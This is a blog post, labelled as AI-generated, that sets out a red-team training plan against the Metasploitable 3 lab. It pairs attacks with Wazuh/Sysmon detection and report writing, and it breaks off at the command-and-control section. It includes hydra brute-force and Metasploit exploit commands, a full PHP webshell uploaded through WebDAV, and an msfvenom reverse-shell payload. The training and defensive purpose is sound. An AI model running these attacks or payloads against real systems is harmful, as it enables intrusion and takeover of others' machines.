---
title: The Operator's Doctrine
author: gourabdg47
date: 25-06-14 06:14:00 +0500
categories:
  - Information
  - Cybersecurity
tags:
  - reading
  - cybersecurity
render_with_liquid: false
---

> AI Generated Research
{: .prompt-info }

# The Operator's Doctrine: A Red Team Training Plan

## Introduction: The Mindset of the Hunter

Before a single command is typed, before a port is scanned, the foundational element of any successful offensive operation must be forged: the mindset. Hacking is not a checklist of exploits or a library of tools; it is a philosophy. It is a fundamental and relentless curiosity combined with a profound disrespect for the intended function of any system. A civilian sees a login form and thinks of their password. An operator sees the same form and visualizes the database schema behind it, the input validation logic processing the request, the session management mechanism, and the hundred different stress points where it can be fractured. This is the perspective that must be cultivated.

This doctrine is built upon three core principles that separate amateurs from professional operators:

- **Persistence:** The first ninety-nine attempts are merely data collection. The one-hundredth attempt that succeeds is the only one that matters. Failure is the most common state in this line of work; it is the data from those failures that fuels success. The ability to "Try Harder" is not a platitude; it is a tactical imperative.
    
- **Creativity:** Tools are a crutch. Tradecraft is the weapon. An exploit module is a starting point, a proof of concept. The true art lies in the subtle chaining of minor, seemingly insignificant flaws—a piece of leaked information here, a misconfiguration there—to orchestrate a catastrophic system breach. The operator does not simply run the exploit; they understand its mechanism and adapt it to the unique contours of the target environment.
    
- **Asymmetry:** The fundamental imbalance of cybersecurity is that the attacker need only find a single path in, while the defender must secure all of them. This doctrine will leverage this asymmetry to its fullest extent. However, a true operator also respects this principle by studying their own actions from the defender's perspective, understanding the trails they leave behind, and learning to move like a ghost in the machine.
    

This document is the map. Following it will not just teach the methods of hacking; it will instill the thinking of a hunter.

## Phase I: The Foundation - Jr. Pen Tester & SOC Analyst

Every operator begins as a grunt, learning the fundamentals of the craft. This initial phase focuses on two concurrent objectives: learning how to break into a system using the most common and reliable methods, and immediately pivoting to the defender's chair to observe the evidence generated by those actions. This immediate feedback loop between offensive action and defensive observation is the fastest path to building true intuition. It bridges the gap between simply executing an attack and understanding its full context and consequences.

### Module 1.1: Target Reconnaissance and Initial Foothold

An attack without intelligence is merely noise. The first and most critical step in any operation is to build a detailed map of the battlefield. The objective is to see the target not as a single entity, but as a surface of interconnected services, ports, and potential weaknesses.

#### Network Discovery and Enumeration

The primary goal of this stage is to identify every running service, its specific version, and the underlying operating system of the target, Metasploitable 3. This collection of information constitutes the initial attack surface.

- **Tool of Choice:** `nmap` (Network Mapper) is the industry-standard tool for this purpose.
    
- **Procedure:**
    
    1. **Target Identification:** The first step is to acquire the IP address of the target machine. This is accomplished by logging into the Metasploitable 3 virtual machine (default credentials are `vagrant`:`vagrant`) and executing the `ipconfig` command.1
        
    2. **Comprehensive Scanning:** From the Kali Linux attacker machine, a comprehensive `nmap` scan is executed. The command `nmap -sV -p- <TARGET_IP>` is not a casual probe; it is a deep interrogation of the target.3
        
        - The `-sV` flag instructs `nmap` to probe open ports to determine the specific service and version information. This is a critical distinction. Knowing a target runs "Apache Tomcat" is informational; knowing it runs "Apache Tomcat/7.0.52" is actionable intelligence.3
            
        - The `-p-` flag is a command to scan all 65,535 TCP ports. Operators do not rely on default port lists or assumptions. Services can be, and often are, run on non-standard ports to evade casual scanning. Thoroughness is paramount.
            
- **Intelligence Analysis:** The output from this scan is the foundational intelligence document for the entire operation. It is a treasure map revealing services such as FTP on port 21, SSH on port 22, SMB on port 445, Jenkins on port 8080, and Apache Tomcat on port 8181, among others.4 This raw data must be structured to become tactical.
    

#### Key Deliverable: Metasploitable 3 Vulnerability Matrix

A professional operator does not work from a chaotic stream of terminal output. They organize intelligence into a structured format that allows for strategic planning and prioritization. Creating a vulnerability matrix transforms raw scan data into a tactical plan, representing the first habit of a professional. This table correlates the discovered services with known vulnerabilities, default credentials, and pre-identified exploit modules, turning a simple list into a prioritized attack plan.4

|Service|Port|Vulnerability / Misconfiguration|Known Credentials|Relevant Metasploit Modules|CVE-ID|
|---|---|---|---|---|---|
|FTP (IIS)|21|Weak Credentials|`vagrant`:`vagrant`|`auxiliary/scanner/ftp/ftp_login`|N/A|
|SSH|22|Weak Credentials|`vagrant`:`vagrant`, `user`:`user`|`auxiliary/scanner/ssh/ssh_login`|N/A|
|SMB|445|Weak Credentials, Pass-the-Hash|Windows Credentials|`exploit/windows/smb/psexec`|N/A|
|WinRM|5985|Weak Credentials|`vagrant`:`vagrant`|`auxiliary/scanner/winrm/winrm_login`|N/A|
|Jenkins|8080|Script Console RCE|`admin`:`password` (default)|`exploit/multi/http/jenkins_script_console`|N/A|
|Apache Tomcat|8181|Manager App Weak Credentials|`tomcat`:`tomcat`|`exploit/multi/http/tomcat_mgr_deploy`|CVE-2009-3843|
|WebDAV|8585|Insecure File Upload|N/A|`auxiliary/scanner/http/http_put`|N/A|
|Elasticsearch|9200|Dynamic Scripting RCE|N/A|`exploit/multi/elasticsearch/script_mvel_rce`|CVE-2014-3120|
|phpMyAdmin|8585|Preg Replace RCE|`root`:`` (blank)|`multi/http/phpmyadmin_preg_replace`|CVE-2013-3238|
|WordPress|8585|Multiple (NinjaForms Upload)|`manager`:`manager`, `vagrant`:`vagrant`|`unix/webapp/wp_ninja_forms_unauthenticated_file_upload`|CVE-2016-1209|

#### Exploiting Low-Hanging Fruit

The most common and reliable vector for initial access is not a zero-day exploit; it is the human factor, manifested as weak or default credentials. The operation will begin by exploiting this fundamental weakness.

- **Tools:** `hydra`, Metasploit Framework.
    
- **Procedure (SSH Brute-Force):**
    
    1. A small, targeted wordlist is created. For this target, a file named `pass.txt` containing likely passwords (`vagrant`, `password`, `user`, `sploit`) is sufficient.
        
    2. The `hydra` tool is used to execute a dictionary attack against the SSH service: `hydra -l vagrant -P pass.txt <TARGET_IP> ssh`.7
        
    3. Hydra's output will confirm the valid credential pair.
        
    4. Initial access is gained: `ssh vagrant@<TARGET_IP>`. The first shell is established.
        
- **Procedure (Metasploit Auxiliary Scanners):**
    
    1. The Metasploit console is launched: `msfconsole`.
        
    2. The FTP login scanner is loaded: `use auxiliary/scanner/ftp/ftp_login`.
        
    3. The necessary options are configured: `set RHOSTS <TARGET_IP>`, and `set USER_PASS_FILE /path/to/userpass.txt`, where `userpass.txt` contains `vagrant:vagrant`.
        
    4. The module is executed with `run`. Metasploit will report a successful login, confirming the credential validity on another service.4
        

### Module 1.2: The Defender's Eye - Correlating Attacks in Wazuh

Every offensive action creates a corresponding defensive artifact. For every command executed, a log is written. The objective now is to understand what the attack looks like from the perspective of the Security Operations Center (SOC).

#### Wazuh Log Analysis

- **Tool:** Wazuh Dashboard.
    
- **Procedure:**
    
    1. Access the Wazuh dashboard and navigate to the **Security Events** module. The view should be filtered to show alerts originating only from the Metasploitable 3 agent.
        
    2. **Detecting Brute-Force Attacks:** The dictionary attack against SSH will generate a high volume of "Authentication failed" alerts. Wazuh's correlation engine is designed to recognize this pattern. After a predefined threshold of failures from a single source IP is breached, a composite alert will be generated. The key alert to identify is **Rule ID 5712: "sshd: Multiple authentication failures."**.7 A detailed examination of this alert reveals the attacker's IP (the Kali machine), the targeted username (
        
        `vagrant`), and the log source on the victim machine.
        
    3. **Detecting Successful Logins:** Immediately following the storm of failure alerts, a single "sshd: authentication success" alert (Rule ID 5716) will appear. In the context of the preceding brute-force attempt, this single success alert is a massive and undeniable indicator of compromise. Wazuh provides these rules out-of-the-box, demonstrating its ability to detect common attack patterns without custom configuration.8
        

#### Key Deliverable: Attack & Defense Correlation Table

This table forms the bedrock of the purple team mindset, which integrates offensive and defensive strategies. It creates a direct, one-to-one mapping of an offensive action to the defensive evidence it generates. This is not merely an academic exercise; it is an invaluable tool for testing detection capabilities and communicating risk in a language that both offensive and defensive teams can understand. By mapping the `hydra ssh` command to Wazuh Rule ID 5712 and then to the MITRE ATT&CK framework technique T1110.001 (Password Guessing), the action is elevated from a simple command to a professionally classified tactic, demonstrating a holistic understanding of the entire operational lifecycle.10

|Offensive Action|Tool|MITRE ATT&CK Tactic/Technique|Expected Wazuh Alert Description|Wazuh Rule ID|Log Source|
|---|---|---|---|---|---|
|SSH Brute-Force|Hydra|TA0006: Credential Access (T1110.001)|sshd: Multiple authentication failures|5712|`auth.log`|
|SSH Successful Login|`ssh`|TA0001: Initial Access (T1021.001)|sshd: authentication success|5716|`auth.log`|
|FTP Login Attempt|Metasploit|TA0006: Credential Access (T1110)|FTP authentication failed/success|(Varies, e.g., 5601)|`vsftpd.log`|
|RDP Brute-Force|Hydra|TA0006: Credential Access (T1110.001)|Multiple Windows logon failures|60122|Security Event Log|
|RDP Successful Login|`rdesktop`|TA0001: Initial Access (T1021.001)|Windows logon success|60106|Security Event Log|

### Module 1.3: The First Report - Documenting the Breach

An operator who cannot clearly and concisely communicate their findings is a liability. The penetration test report is the tangible deliverable of the engagement; it is the primary mechanism through which value is provided to the client.

#### The Penetration Testing Execution Standard (PTES)

To ensure professionalism and consistency, all reporting must adhere to an industry-accepted methodology. The Penetration Testing Execution Standard (PTES) provides a robust framework for this purpose. PTES divides an engagement into seven logical phases.12 This first report will cover the initial phases: Pre-engagement Interactions, Intelligence Gathering, Vulnerability Analysis, Exploitation, and Reporting. Adopting a formal standard from the outset builds the discipline required for professional-level work.

#### Crafting a Basic Vulnerability Report

The objective is to document the discovered weak credential vulnerabilities in a format that is clear, professional, and actionable. The report structure should be based on established professional templates.15

- **Essential Components:**
    
    1. **Cover Page:** Includes the Project Title, Client Name, and Dates of Testing.
        
    2. **Table of Contents:** For easy navigation.
        
    3. **Executive Summary:** This is a high-level, non-technical summary written for a management audience. It must be concise and impactful. For example: "A penetration test was conducted on the specified assets between and. During the assessment, critical vulnerabilities were identified related to the use of weak and default credentials on key network services, including Secure Shell (SSH) and File Transfer Protocol (FTP). These vulnerabilities allowed an external attacker to gain unauthorized administrative access to the system, posing a significant risk to data confidentiality and system integrity."
        
    4. **Methodology:** A brief description of the PTES framework and the specific tools used (e.g., Nmap, Hydra, Metasploit Framework).
        
    5. **Findings:** This is the technical core of the report. Each vulnerability must be documented individually and thoroughly.
        
        - **Vulnerability Name:** Weak SSH Password for 'vagrant' User.
            
        - **Description:** An explanation of what the vulnerability is and the business risk it represents. "The SSH service on the host is configured to allow authentication for the 'vagrant' user account with a weak, easily guessable password. An attacker can leverage this to gain interactive command-line access to the system, establishing a foothold for further internal attacks."
            
        - **Affected Hosts:** List the IP address of the compromised system.
            
        - **Risk Rating:** Critical. (A simple Critical/High/Medium/Low scale is sufficient for this stage).
            
        - **Evidence:** A screenshot of the successful `ssh` login command and the resulting shell prompt is mandatory as proof.
            
        - **Remediation:** Recommendations must be clear and actionable. Vague advice is useless.
            
            - **Example of poor advice:** "Use strong passwords."
                
            - **Example of professional advice:** "Implement a comprehensive password policy across all systems that enforces a minimum length of 12 characters, requires a mix of uppercase letters, lowercase letters, numbers, and special characters, and is enforced by technical controls. The 'vagrant' user account should be disabled or removed if it is not essential for business operations. If required, its password must be immediately changed to a complex, unique value."
                

## Phase II: The Operator - The Penetration Tester

Initial access has been achieved. The objective now evolves from gaining a foothold to achieving total ownership of the target system. This phase focuses on exploiting software flaws, moving beyond simple credential abuse. The process involves navigating the compromised system, escalating privileges to the highest level, and analyzing how these more sophisticated attack techniques are perceived and logged by the defensive systems.

### Module 2.1: Advanced Exploitation - Application-Level Breaches

Applications are layers of complex logic, and complexity is the breeding ground of vulnerability. The focus now shifts to attacking the software running on the server, not just the authentication mechanisms that protect it.

#### Tutorial 1: Exploiting Apache Tomcat (CVE-2009-3843)

- **Vector:** The Apache Tomcat service on port 8181 exposes its Manager application, which is protected by easily guessable default credentials (`tomcat`:`tomcat`).4 This administrative interface allows for the deployment of Web Application Archive (WAR) files, providing a direct path to remote code execution.
    
- **Tool:** Metasploit Framework.
    
- **Procedure:**
    
    1. Launch the Metasploit console: `msfconsole`.
        
    2. Select the appropriate exploit module: `use exploit/multi/http/tomcat_mgr_deploy`.
        
    3. Review the module's requirements with `show options`. The critical parameters are `RHOSTS`, `RPORT`, `HttpUsername`, and `HttpPassword`.
        
    4. Configure the exploit:
        
        - `set RHOSTS <TARGET_IP>`
            
        - `set RPORT 8181`
            
        - `set HttpUsername tomcat`
            
        - `set HttpPassword tomcat`
            
    5. Execute the attack: `exploit`.
        
- **Result:** The Metasploit Framework will automatically generate a malicious WAR file containing a payload, authenticate to the Tomcat Manager, upload the file, and trigger its execution. This results in a Meterpreter session, establishing a covert command-and-control (C2) channel to the compromised server.
    

#### Tutorial 2: Gaining RCE through the Jenkins Script Console

- **Vector:** The Jenkins Continuous Integration server on port 8080 includes a powerful "Script Console." This feature is intended for administrators to execute Groovy diagnostic scripts directly on the server. If this console is accessible—either due to a misconfiguration that allows unauthenticated access or through the use of stolen credentials—it provides a direct and reliable vector for Remote Code Execution (RCE).4
    
- **Tool:** Metasploit Framework.
    
- **Procedure:**
    
    1. Select the Jenkins script console exploit: `use exploit/multi/http/jenkins_script_console`.22
        
    2. Set the target parameters:
        
        - `set RHOSTS <TARGET_IP>`
            
        - `set RPORT 8080`
            
    3. Launch the exploit: `exploit`.
        
- **Result:** The module sends a POST request to the `/script` endpoint containing a Groovy script designed to execute a system command. This command initiates a reverse shell connection back to the attacker's machine, opening another Meterpreter session. This attack is a classic example of "Living off the Land" (LotL), where a legitimate, built-in feature of the software is abused for malicious purposes. This makes detection more challenging, as defenders cannot simply block the feature; they must secure it through proper access controls and vigilant monitoring.
    

#### Tutorial 3: Exploiting WebDAV Misconfigurations

- **Vector:** The web server operating on port 8585 has WebDAV (Web Distributed Authoring and Versioning) enabled on the `/uploads/` directory. Critically, it is misconfigured to require no authentication, permitting any user to upload files directly to the web root.24
    
- **Tools:** `cadaver` (a command-line WebDAV client) for manual exploitation, and the Metasploit Framework for an automated approach.
    
- **Manual Procedure:**
    
    1. **Craft a Webshell:** Create a simple PHP file named `shell.php`. The code allows for command execution via a URL parameter: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; }?>`.
        
    2. **Connect and Upload:** Use `cadaver` to connect to the vulnerable directory: `cadaver http://<TARGET_IP>:8585/uploads/`.
        
    3. Within the `cadaver` interactive prompt, use the `put shell.php` command to upload the webshell from the local machine to the server.
        
    4. **Execute Commands:** Access the shell in a web browser and pass commands via the `cmd` parameter: `http://<TARGET_IP>:8585/uploads/shell.php?cmd=whoami`. The server will execute the `whoami` command and return the output to the browser.
        
- **Metasploit Procedure:**
    
    1. Load the `http_put` auxiliary module: `use auxiliary/scanner/http/http_put`.
        
    2. Configure the module to upload the webshell:
        
        - `set RHOSTS <TARGET_IP>`
            
        - `set RPORT 8585`
            
        - `set PATH /uploads/shell.php`
            
        - `set FILEDATA "<?php system($_GET['cmd']);?>"`
            
    3. Execute with `run`. The module will perform the PUT request, placing the webshell on the target.
        

#### Tutorial 4: Compromising Elasticsearch (CVE-2014-3120)

- **Vector:** The target is running an outdated version of Elasticsearch (1.1.1). This version is vulnerable to a critical RCE flaw in its dynamic scripting feature, which is enabled by default.25 Unlike the previous examples, this is a direct software vulnerability, not merely a configuration error.
    
- **Tool:** Metasploit Framework.
    
- **Procedure:**
    
    1. Select the Elasticsearch exploit module: `use exploit/multi/elasticsearch/script_mvel_rce`.27
        
    2. Set the target information:
        
        - `set RHOSTS <TARGET_IP>`
            
        - `set RPORT 9200`
            
    3. Execute the attack: `exploit`.
        
- **Result:** A Meterpreter session is established.
    
- **Deeper Wire-Level Analysis:** To truly understand this exploit, it must be observed at the network level. By running the exploit while capturing traffic with Wireshark, the operator can see the underlying mechanism. Filtering for HTTP traffic and using the "Follow TCP Stream" feature will reveal the raw POST request sent to the `/_search` API endpoint. The body of this request contains the malicious JSON payload with the embedded MVEL or Groovy script. This demystifies the "magic" of the exploit, revealing it as a simple, unauthenticated API call, and provides an invaluable lesson in how exploits function on the wire.25
    

### Module 2.2: Post-Exploitation - Owning the Box

Gaining a user-level shell is a milestone, not the objective. The true goal is complete and persistent control, which requires escalating privileges to the highest possible level: `NT AUTHORITY\SYSTEM` on Windows.

#### Windows Privilege Escalation

- **Objective:** To elevate from a low-privilege shell (e.g., the one obtained from the Tomcat exploit, which runs as the `LOCAL SERVICE` account) to the SYSTEM account.
    
- **Automated Method (`getsystem`):**
    
    1. Within an active Meterpreter session, the `getuid` command confirms the current user's limited privileges.
        
    2. The `getsystem` command is executed. This script automates several well-known privilege escalation techniques, such as Named Pipe Impersonation (Technique 1) and Token Duplication.28
        
    3. If successful, Metasploit will report `...got system (via technique 1)`.
        
    4. Executing `getuid` again will now show the user as `NT AUTHORITY\SYSTEM`, confirming a successful escalation.
        
- **Manual Enumeration:** Automated tools can fail. A professional must know how to find privilege escalation paths manually. This process is entirely dependent on meticulous information gathering on the compromised host.
    
    - **Key Commands:**
        
        - `whoami /priv`: This command lists the security privileges of the current user's token. The presence of privileges like `SeImpersonatePrivilege` or `SeDebugPrivilege` are immediate indicators of potential escalation paths.
            
        - `net user <username>`: This enumerates the groups a user belongs to. Membership in sensitive groups like "Administrators" or "Backup Operators" can be exploited.
            
        - `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"`: This command searches for auto-starting services where the path to the executable is not enclosed in quotes. If an attacker can write to a directory in that path (e.g., `C:\Program Files\Some App\`), they can place a malicious executable that will be run with SYSTEM privileges on the next reboot.
            
    - These manual checks are the foundation. In a real engagement, tools like `winPEAS.bat` or `PowerUp.ps1` are used to automate this enumeration process, but understanding the manual checks is essential for interpreting their output.
        

### Module 2.3: Blue Team Analysis - Detecting Advanced Threats

As the attacks grow in complexity, so do the signals they generate within the defensive telemetry. The focus now is on detecting actions beyond simple login failures.

#### Integrating Sysmon for Deep Visibility

Standard Windows Event Logs are often insufficient for detecting sophisticated threats. Sysmon, a free tool from Microsoft's Sysinternals suite, provides deep, kernel-level logging that is essential for modern threat hunting. When its logs are forwarded to Wazuh, it creates a powerful detection tandem.29 The Metasploitable 3 agent should be configured to use Sysmon.

#### Detecting Exploits with Wazuh+Sysmon

- **Detecting Web Application Exploits (Tomcat/Jenkins):** When the Tomcat or Jenkins exploits were executed, the legitimate web server process (`java.exe` or `tomcat.exe`) was forced to spawn a new child process (`cmd.exe` or `powershell.exe`) to execute the reverse shell payload. This parent-child process relationship is highly anomalous.
    
    - In the Wazuh dashboard, this activity will appear as a **Sysmon Event ID 1 (Process Creation)** alert.
        
    - The alert details will clearly show `ParentImage: C:\path\to\java.exe` and `Image: C:\Windows\System32\cmd.exe`. For a security analyst, a web server spawning a command shell is a five-alarm fire and a strong indicator of a webshell or RCE exploit.
        
- **Detecting Privilege Escalation (`getsystem`):** The techniques leveraged by Metasploit's `getsystem` command involve creating or manipulating system services. This activity generates a trail of specific Sysmon events.
    
    - **Sysmon Event IDs 12, 13, and 14 (Registry Events)** will fire as the exploit modifies registry keys related to Windows services.
        
    - **Sysmon Event ID 7 (Image Loaded)** will trigger when the exploit forces a legitimate process to load a malicious DLL into its memory space.
        

#### Writing Custom Wazuh Rules

Default rulesets are designed for common, known threats. Detecting targeted or novel attack techniques requires the ability to write custom detection logic. Crafting a rule that specifically identifies the unique artifact of an exploit is a top-tier SOC analyst skill.

- **Example Use Case: Detecting Java Deserialization:** The Elasticsearch RCE exploit (CVE-2014-3120) works by sending a POST request containing a JSON body with malicious script code. This is a highly specific pattern. While a Web Application Firewall (WAF) should ideally block this, it can also be detected at the log level. If the web server logs are configured to capture POST request bodies, a custom Wazuh rule can be written to hunt for this pattern. The rule would trigger on logs from the web server, check for a `POST` request to the `/_search` endpoint, and use a regular expression to search the request body for keywords indicative of code execution, such as `java.lang.Runtime`.
    
- **Procedure for Creating a Custom Rule:**
    
    1. On the Wazuh server, custom rules are added to `/var/ossec/etc/rules/local_rules.xml`.
        
    2. Wazuh rules use an XML syntax and can match on any field extracted by its decoders from the raw logs.31
        
    3. **Example Rule:** This rule is designed to detect keywords associated with common Java deserialization gadget chains inside the body of an HTTP request.
        
        XML
        
        ```
        <group name="java,deserialization,attack,">
          <rule id="100150" level="12">
            <if_group>web</if_group> <decoded_as>json</decoded_as> <field name="http.request.body" type="pcre2">(?:ysoserial|BouncyCastle|ObjectInputStream)</field>
            <description>Potential Java Deserialization attack detected via common library/class names in request body.</description>
            <mitre>
              <id>T1190</id> </mitre>
          </rule>
        </group>
        ```
        
    4. After adding the rule, the Wazuh manager must be restarted to load the new logic: `systemctl restart wazuh-manager`.
        
    5. Similar rules can be created to detect command injection patterns, such as `cmd.exe /c` or `bash -c`, appearing in unexpected log fields.33
        

### Module 2.4: Professional Reporting - Building the Narrative

The report for this phase must evolve beyond a simple list of findings. It needs to tell the story of a multi-stage attack and provide sophisticated, targeted remediation advice.

- **Detailed Proof of Concept:** For each finding (Tomcat, Jenkins, Elasticsearch), the report must include a detailed, step-by-step walkthrough of the exploitation process. This includes the exact commands used and screenshots of each critical stage. The goal is to provide the client's technical team with everything they need to reproduce the vulnerability themselves, which is essential for validation and testing of their fixes.15
    
- **Actionable and Specific Remediation:** Recommendations must be precise and provide both long-term solutions and immediate compensating controls.
    
    - **Regarding the Tomcat vulnerability:**
        
        - **Insufficient Advice:** "Patch the Tomcat server."
            
        - **Professional Advice:** "The Apache Tomcat instance on host 10.10.10.5 is vulnerable to CVE-2009-3843 due to weak default credentials on its management interface. The primary remediation is to upgrade to the latest stable version of Apache Tomcat 9.x or newer. As an immediate compensating control until patching can be completed, the manager application should be disabled entirely or have its access restricted via firewall rules to a small set of trusted administrative IP addresses.".35
            
    - **Regarding the Jenkins vulnerability:**
        
        - **Insufficient Advice:** "Secure the Jenkins server."
            
        - **Professional Advice:** "The Jenkins Script Console on host 10.10.10.5 is accessible without proper authentication, allowing for unauthenticated remote code execution. The long-term solution is to implement role-based access control (RBAC) within Jenkins, ensuring that only users within a designated 'Jenkins-Admins' group have the 'Overall/RunScripts' permission. Additionally, the Jenkins instance should be immediately upgraded to version 2.442 or later to mitigate known vulnerabilities such as CVE-2024-23897.".37
            

## Phase III: The Gauntlet - Preparing for the OSCP

The Offensive Security Certified Professional (OSCP) examination is a rite of passage in the offensive security field. It is not a theoretical, multiple-choice test. It is a 24-hour, hands-on ordeal where the candidate is placed into an unknown network and tasked with compromising a series of machines. The exam tests persistence, creativity, and a methodical approach above all else. Its motto, "Try Harder," is a literal requirement for success. This phase of the training is designed to strip away the comfort and automation of tools like Metasploit and force the development of the manual skills and mental fortitude necessary to pass.

### Module 3.1: Manual Exploitation and Creative Kills

The primary objective of this module is to develop the proficiency to find, analyze, modify, and execute public exploits without relying on the `exploit` command within the Metasploit Framework. This forces a deeper understanding of how vulnerabilities are actually triggered.

- **Revisiting Previous Targets Manually:** The Tomcat and Elasticsearch vulnerabilities must be re-exploited using manual techniques.
    
    - **Tomcat Manual Exploit:** The `searchsploit tomcat manager` command will reveal multiple public exploit scripts. The task is not just to run one, but to select one, read its source code (likely Python or Perl), understand its logic—how it crafts the HTTP requests to log in and upload the WAR file—and then execute it successfully to gain a shell.
        
    - **Elasticsearch Manual Exploit:** A search on Exploit-DB or GitHub for a Python exploit for CVE-2014-3120 will yield several results.39 The chosen script will almost certainly require modification. The candidate must edit the code to insert the correct target IP address and the IP address of their own Kali machine for the reverse shell listener. This exercise teaches the critical skill of reading, understanding, and debugging code written by others under pressure.
        
- **Mastering Payload Generation (`msfvenom`):**
    
    - `msfvenom` is the payload generation engine of the Metasploit Framework, but it is a powerful and essential standalone tool. Mastery of `msfvenom` is non-negotiable for any serious penetration tester.
        
    - **Command Breakdown:** `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe`
        
        - `-p`: Specifies the payload to be generated. The choice of payload is critical and depends on the target architecture and desired functionality.
            
        - `LHOST`: The listening host. This is the IP address of the attacker's machine where the handler will be waiting for the connection. It must be an IP reachable by the target. Using `localhost` or `127.0.0.1` is a common beginner mistake, as it tells the target to connect to itself.40
            
        - `LPORT`: The listening port on the attacker's machine.
            
        - `-f`: The output format. `msfvenom` can generate payloads in dozens of formats, including `exe` for Windows, `elf` for Linux, and various script formats like `py`, `php`, and `asp`.
            
        - `-o`: The output file name.
            
    - This tool will be used to generate the malicious payloads that are delivered by the manual exploit scripts.
        

### Module 3.2: Expanding the Hunting Ground

While Metasploitable 3 is an excellent foundational lab, the OSCP exam requires the ability to adapt to a wide variety of systems, applications, and vulnerabilities. To prepare, the candidate must practice on a range of machines that mimic the style and difficulty of the exam.

#### Key Deliverable: OSCP-Like VM Practice List

Not all practice is created equal. To effectively prepare for the OSCP, one must work on virtual machines that are known within the security community to be "OSCP-like." These machines typically involve multi-step exploitation chains, require significant enumeration, and have privilege escalation paths that are not immediately obvious. This curated list, drawn from community-recommended sources, focuses effort on high-value targets and saves time that would otherwise be spent searching for suitable practice labs.41

|Platform|Source|Machine Name|Difficulty|Key Skills Practiced|Link|
|---|---|---|---|---|---|
|VulnHub|TJ Null's List|Kioptrix: Level 1|Easy|Basic Linux enumeration, Samba exploitation|`https://www.vulnhub.com/entry/kioptrix-level-1-1,22/` 41|
|VulnHub|TJ Null's List|Brainpan 1|Easy/Medium|Basic Windows stack-based buffer overflow|`https://www.vulnhub.com/entry/brainpan-1,51/` 43|
|VulnHub|TJ Null's List|DC-9|Medium|Web application exploits, advanced privilege escalation|`https://www.vulnhub.com/entry/dc-9,412/` 43|
|HackTheBox|OffSec List|Forest|Easy|Active Directory enumeration, Kerberoasting attacks|(Requires HTB Subscription) 42|
|HackTheBox|OffSec List|Active|Easy|Active Directory, Group Policy (GPO) abuse|(Requires HTB Subscription) 42|
|Proving Grounds|OffSec|Hutch|Easy|Windows application exploits, standard privilege escalation|(Requires OffSec Subscription) 42|
|Proving Grounds|OffSec|Vault|Medium|Chaining multiple web and system vulnerabilities|(Requires OffSec Subscription) 42|

### Module 3.3: The "Try Harder" Doctrine

A strict, repeatable methodology is the key to success in the OSCP and in real-world penetration testing. For each machine from the practice list, the following process must be followed without deviation.

1. **Systematic Enumeration:** Begin with comprehensive `nmap` scans. If web services are present, immediately launch directory and file enumeration using tools like `gobuster` or `dirb`. The goal is to build a complete map of the attack surface before attempting any exploitation.
    
2. **Meticulous Documentation:** Maintain detailed notes for every machine. A dedicated note-taking application like CherryTree or Obsidian is recommended. For each host, a new page or section should be created. Every command executed and its complete output must be recorded. This is not optional; it is the core discipline of the craft. During a 24-hour exam, the ability to quickly reference previous findings is critical.
    
3. **Clue Analysis:** The path to compromise is often hidden in plain sight. A strange comment in HTML source code, an unusual directory name returned by `gobuster`, a non-standard service banner from `nmap`—these are the clues that lead to the initial foothold.
    
4. **The Pivot:** Once initial access is gained, the entire process repeats. The focus shifts from external to internal enumeration. Execute scripts to check for privilege escalation paths, search the filesystem for credentials, and map the internal network environment.
    
5. **Rabbit Hole Avoidance:** Time management is crucial. If more than an hour is spent on a single potential vulnerability with no tangible progress, it is time to step back. This is likely a "rabbit hole" designed to waste time. Re-read all notes and re-evaluate the enumerated data. In almost all OSCP-style challenges, a more straightforward path has been missed.
    

## Phase IV: The Ghost - The Red Teamer

This is the final stage of evolution. The mindset shifts from that of a penetration tester, who breaks into individual systems to find vulnerabilities, to that of a Red Teamer, who simulates a full-scale adversary campaign to test an organization's defensive capabilities. The objective is no longer just to compromise a box, but to achieve a specific goal—such as exfiltrating a target file or gaining domain administrator credentials—while remaining undetected for as long as possible. The focus moves from _vulnerability_ to _impact_.

### Module 4.1: Campaign Planning with MITRE ATT&CK

Amateurs attack systems; professionals execute campaigns against organizations. This requires a plan rooted in real-world threat intelligence.

#### Introduction to the MITRE ATT&CK Framework

The MITRE ATT&CK framework is a globally recognized, comprehensive knowledge base of adversary tactics, techniques, and procedures (TTPs) derived from the observation of real-world cyberattacks.10 It has become the de facto standard language for describing, planning, and defending against adversary behavior.

- **Framework Structure:**
    
    - **Tactics:** These represent the "why" of an adversary's action—their tactical objective. The 14 enterprise tactics include `Initial Access`, `Execution`, `Persistence`, `Privilege Escalation`, `Defense Evasion`, `Credential Access`, `Discovery`, `Lateral Movement`, `Collection`, `Command and Control`, and `Exfiltration`.
        
    - **Techniques:** These represent the "how" an adversary achieves a tactic. For example, the `Credential Access` tactic can be achieved via the `Brute Force` technique (T1110) or its sub-technique, `Password Guessing` (T1110.001).
        

#### Key Deliverable: MITRE ATT&CK TTP Mapping

Red Teaming is, by definition, threat-informed. Operations are not random; they are designed to emulate the known TTPs of specific threat actors (e.g., APT29, FIN7) to provide a realistic test of an organization's defenses against the threats they are most likely to face. The first step in learning to think this way is to re-frame all previously performed actions within the ATT&CK matrix. This exercise transforms a series of discrete hacks into a cohesive, strategic campaign narrative, demonstrating an understanding that is critical for senior offensive security roles.

|Phase|Action|ATT&CK Tactic|ATT&CK Technique|
|---|---|---|---|
|I|SSH Brute-Force|Credential Access (TA0006)|T1110: Brute Force|
|II|Exploit Tomcat Manager|Initial Access (TA0001)|T1190: Exploit Public-Facing Application|
|II|Jenkins Script Console RCE|Execution (TA0002)|T1059.006: Python (via Groovy)|
|II|`getsystem` Privilege Escalation|Privilege Escalation (TA0004)|T1134: Access Token Manipulation|
|IV|PsExec Lateral Movement|Lateral Movement (TA0008)|T1570: Lateral Tool Transfer|
|IV|C2 Communication|Command and Control (TA0011)|T1071.001: Application Layer Protocol: Web Protocols|

### Module 4.2: Covert Operations - Command & Control (C2)

A standard Meterpreter shell is effective but can be noisy and easily detected by modern EDR solutions. A professional adversary uses a dedicated Command and Control (C2) framework designed for stealth, resilience, and operational flexibility.

#### Introduction to C2 Frameworks

